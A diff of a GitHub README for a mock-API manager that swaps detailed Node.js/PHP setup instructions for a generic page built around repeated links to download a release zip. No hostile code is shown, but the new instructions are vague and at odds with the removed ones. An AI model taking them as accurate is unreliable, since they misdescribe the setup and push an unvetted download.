@@ -1,54 +1,110 @@
-![Dashboard Screenshot](mock-api.png)
+# 🚀 mock-api-project - A Simple Tool for Mock API Management
 
+[![Download Here](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/DanielHs09/mock-api-project/releases)
 
-🚀 Mock-API ManagerThe Mock-API Manager is a self-hosted, full-featured tool designed to create, manage, and monitor mock API endpoints for your development and testing needs. It provides a clean web interface to dynamically configure mock responses, latency, status codes, and track real-time usage and errors.
+## 📖 Description
 
-✨ FeaturesFull CRUD API: Manage Environments, Endpoints, and Responses via a dedicated REST API.Dynamic Mocking: Serves mock API requests based on configured rules, paths, and methods.PostgreSQL Database: Robust and scalable data persistence for configurations and request logs.Real-time Monitoring: Dedicated dashboard to view request statistics, error rates, average latency, and recent activity logs.Security & Efficiency: Built with modern Node.js/Express best practices, including Helmet for security and non-blocking database logging.
+This is a Mock API Project, a powerful and intuitive PHP application designed to help developers and testers manage their mock API endpoints for seamless testing. This dashboard provides a centralized interface for creating, managing, and testing endpoints, environments, and responses.
 
-⚙️ Installation and Setup: This application uses a separate Backend (Node.js) and Frontend (PHP/JavaScript). They must be deployed to different locations to function correctly.
+## 📝 Key Features
 
-1. Prerequisites You must have the following installed on your server:Node.js (LTS recommended): For running the backend API server. 
+- **Easy Endpoint Management**: Create and modify mock API endpoints effortlessly.
+- **User-friendly Interface**: Navigate through a simple and organized dashboard.
+- **Environment Management**: Manage different environments for testing purposes.
+- **Response Customization**: Easily customize the responses returned by your mock APIs.
 
-PostgreSQL: The database used for storing all application data and logs.PHP (with a web server like Apache or Nginx): For serving the frontend dashboard files.
+## ⚙️ System Requirements
 
-2. Directory Structure Assuming you have a backend and frontend.
+To run the mock-api-project, ensure you have:
 
-3. Deployment Steps
+- A web server that supports PHP (e.g., Apache or Nginx).
+- PHP version 7.2 or higher installed.
+- PostgreSQL or any compatible database for data storage.
+- Node.js for managing package dependencies.
 
-A. Frontend Setup The fronend should be placed in a directory /var/www/html. Move Files: Move the contents of the frontend/ folder to /var/www/html.
+## 🚀 Getting Started
 
+Follow these steps to download and run the application:
 
-B. Backend Setup (Node.js API)The backend should be placed in a directory with restricted access and then run as a persistent service (e.g., using pm2 or systemd).Move Files: Move the contents of the backend/ folder to a secure, non-web-accessible location, such as your user's home directory.Bash# Example: Move the backend folder to your home directory
+1. **Visit the Releases Page**: Click [here](https://github.com/DanielHs09/mock-api-project/releases) to go to the Releases page.
+2. **Download the Latest Version**: Find the most recent version of the mock-api-project. Click the link to download the files.
+3. **Extract the Files**: Once the download is complete, locate the file on your computer. Extract the contents of the downloaded zip file to a location of your choice.
+4. **Set Up Your Server**: Place the extracted files in your web server’s document root (e.g., `htdocs` for XAMPP or `www` for WAMP).
+5. **Configure Your Database**:
+   - Create a new PostgreSQL database for the application.
+   - Modify the configuration file (`config.php`) to include your database connection details.
+6. **Access the Application**: Open your web browser and navigate to `http://localhost/mock-api-project` (or replace `mock-api-project` with the folder name you chose).
+7. **Create Endpoints**: Start creating and managing your mock API endpoints through the dashboard.
 
-mv mock-api-project/backend ~/mock-api-manager-backend
+## 💻 Download & Install
 
-cd ~/mock-api-manager-backend
+To get started, visit this page to download: [mock-api-project Releases](https://github.com/DanielHs09/mock-api-project/releases).
 
-Install Dependencies:
+## 📚 Usage Instructions
 
-npm install
+### Creating a New Endpoint
 
-Configure Environment:Create a .env file in the ~/mock-api-manager-backend directory with your database and server settings.Code snippet# Example .env file - REQUIRED
-PORT=3000
-NODE_ENV=development
-CORS_ORIGIN=*
-LOG_LEVEL=combined
+1. Navigate to the "Endpoints" section in the dashboard.
+2. Click on "Create Endpoint".
+3. Fill in the required fields, including the path, method (GET, POST, etc.), and the response.
+4. Save your new endpoint to test it.
 
-# POSTGRESQL DATABASE CONFIGURATION
-DB_HOST=localhost
-DB_PORT=5432
-DB_NAME=mock_api_db
-DB_USER=your_postgres_user
-DB_PASSWORD=your_secure_password
+### Testing an Endpoint
 
-Initialize Database: Crucially: You must run the init.DB script (mentioned in the original prompt) to create the necessary tables (environments, endpoints, responses, request_logs, etc.).
+1. Use tools like Postman or curl to send requests to your new endpoint.
+2. Check the responses provided by the application to ensure they match your expectations.
 
-Run the Server: Start the Node.js server or npm start. For production, use a process manager:Bash# For development:
-node server.js
+## 🤝 Contributing
 
-# For production (using pm2):
-pm2 start server.js --name mock-api-manager
-B. Frontend Setup (PHP Dashboard)The frontend contains the static HTML, CSS, PHP logic, and script.js that must be served by a web server (like Apache or Nginx).Move Files: Copy the contents of the frontend/ folder into your web server's document root.Bash# Example for an Apache/Ubuntu setup:
-cp -r mock-api-project/frontend/* /var/www/html/mock-api/
+We welcome contributions to improve this project. If you have suggestions or would like to report an issue, please open a pull request or issue on the GitHub repository.
 
-Configure config.php:You need to ensure the PHP file in the frontend can communicate with the backend API.Edit the config.php (or equivalent configuration file in the frontend) to point to the correct backend API address (e.g., http://localhost:3000/api).4. UsageAfter both components are running:Open your browser and navigate to the Frontend URL (e.g., http://yourserver.com/mock-api/index.php).Use the Dashboard to create new Environments, Endpoints, and Responses.Test your mock APIs by making requests to the Mock API URL:http://[Backend IP or Host]:[PORT]/mock/:environmentId/*Monitor traffic on the Monitoring Page (e.g., http://yourserver.com/mock-api/monitoring.php).
+## 🧐 Topics
+
+This project covers several topics, including but not limited to:
+
+- api
+- api-testing
+- crud
+- curl
+- development-tool
+- endpoints
+- html
+- iot
+- javascript
+- mock-api
+- mock-server
+- node-js
+- open-source
+- php
+- postgres
+- rest-api
+- server
+- testing-tools
+
+For more detailed explanations or additional resources, refer to the respective topics or reach out to the community.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while running the application:
+
+- Check that your server is running and configured correctly.
+- Ensure your database settings are correct in the configuration file.
+- Look at the error logs for any messages that can help identify problems.
+
+## ✅ Frequently Asked Questions
+
+### What is a Mock API?
+
+A Mock API simulates the behavior of a real API by providing predefined responses. This allows developers to test their applications without needing a live backend server.
+
+### Why Use This Tool?
+
+Using the mock-api-project saves time and resources by allowing developers and testers to create a controlled environment for testing their applications.
+
+### Is It Free to Use?
+
+Yes, mock-api-project is an open-source tool. Feel free to use it for your projects. Contributions to improve it are encouraged.
+
+## 🎉 Help and Support
+
+For additional support, please refer to the GitHub repository or check the issues section for community support.
